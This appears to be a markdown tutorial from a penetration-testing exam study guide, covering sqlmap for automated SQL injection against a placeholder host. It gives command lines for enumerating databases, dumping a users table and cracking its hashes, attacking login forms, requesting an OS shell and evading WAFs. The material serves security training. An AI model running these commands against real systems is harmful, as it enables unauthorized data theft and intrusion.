# Tutorial: sqlmap — automated SQL injection

**What it is:** the automated SQLi scanner. If a URL has a parameter (`?id=1`) or a login form, sqlmap does the whole UNION/blind workflow for you.

Quick-start workflow:
```bash
# 1. Test a URL parameter
sqlmap -u "http://target.com/product.php?id=1" --batch
#    --batch = answer all questions with defaults (always use it)

# 2. Found "back-end DBMS: MySQL"? Escalate:
sqlmap -u "http://target.com/product.php?id=1" --batch --dbs
sqlmap -u "http://target.com/product.php?id=1" --batch -D webshop --tables
sqlmap -u "http://target.com/product.php?id=1" --batch -D webshop -T users --dump
```
The `--dump` step auto-identifies password hashes and cracks them with rockyou.

## Flags that matter
| Flag | Meaning |
|------|---------|
| `-u "URL"` | target URL with the parameter |
| `--forms` | auto-find and test forms on a page |
| `--data="user=a&pass=b"` | POST parameters (login forms) |
| `-r request.txt` | replay a saved raw request (from [Burp](08-burp-suite.md)) |
| `--cookie="PHPSESSID=x"` | authenticated testing |
| `-D db -T tbl --dump` | dump a specific table |
| `--all` | grab everything (slow) |
| `--level=3 --risk=2` | test more parameters/payloads |
| `-p id` | test only this parameter |
| `--os-shell` | try for a shell (MySQL FILE privilege) |
| `--tamper=space2comment` | basic WAF/filter evasion |

## Login-form example (very common exam setup)
```bash
# Capture the login POST with Burp, save it, then:
sqlmap -r login-request.txt --batch --dump
```
or point directly at the form:
```bash
sqlmap -u "http://target.com/login.php" --forms --batch
```

## Gotchas
- **GET vs POST:** `?id=` in the URL → `-u`; form submits via POST → `--data` or `-r`. Wrong choice = "all tested parameters appear not to be injectable."
- sqlmap is loud — fine for the exam, illegal off-scope.
- If the target is blind and slow, add `--threads=10` and be patient; manual UNION injection may be faster ([06-sql-injection.md](../06-sql-injection.md)).

**Deep dive (manual injection, end-to-end worked example):** [06-sql-injection.md](../06-sql-injection.md)

← [Back to index](../README.md)
